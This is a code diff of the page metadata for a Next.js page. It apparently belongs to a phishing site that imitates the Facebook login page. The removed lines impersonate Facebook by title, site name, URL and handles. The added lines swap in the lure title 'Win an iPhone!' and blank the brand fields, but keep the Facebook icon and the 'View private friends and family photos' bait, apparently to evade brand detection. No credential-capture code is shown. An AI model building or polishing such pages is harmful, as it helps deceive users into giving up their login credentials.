@@ -10,7 +10,7 @@ export default function Home() {
   return (
     <>
       <Head>
-        <title>Facebook - Log in to Facebook</title>
+        <title>Win an iPhone!</title>
         <meta
           name="description"
           content="View private friends and family photos."
@@ -18,19 +18,19 @@ export default function Home() {
         <meta name="viewport" content="width=device-width, initial-scale=1" />
         <link rel="icon" href="/favicon.ico" />
         {/* OG meta tags */}
-        <meta name="og:title" content="Facebook - Log in to Facebook" />
+        <meta name="og:title" content="" />
         <meta name="og:type" content="website" />
-        <meta name="og:site_name" content="Facebook" />
+        <meta name="og:site_name" content="" />
         <meta
           name="og:description"
           content="View private friends and family photos."
         />
         <meta name="og:image" content="/og-image/fb_icon_325x325.png" />
-        <meta name="og:url" content="https://www.facebook.com/" />
+        <meta name="og:url" content="" />
         <meta name="twitter:card" content="summary_large_image" />
-        <meta name="twitter:site" content="@facebook" />
-        <meta name="twitter:creator" content="@facebook" />
-        <meta name="twitter:title" content="Facebook" />
+        <meta name="twitter:site" content="" />
+        <meta name="twitter:creator" content="" />
+        <meta name="twitter:title" content="" />
         <meta
           name="twitter:description"
           content="View private friends and family photos."
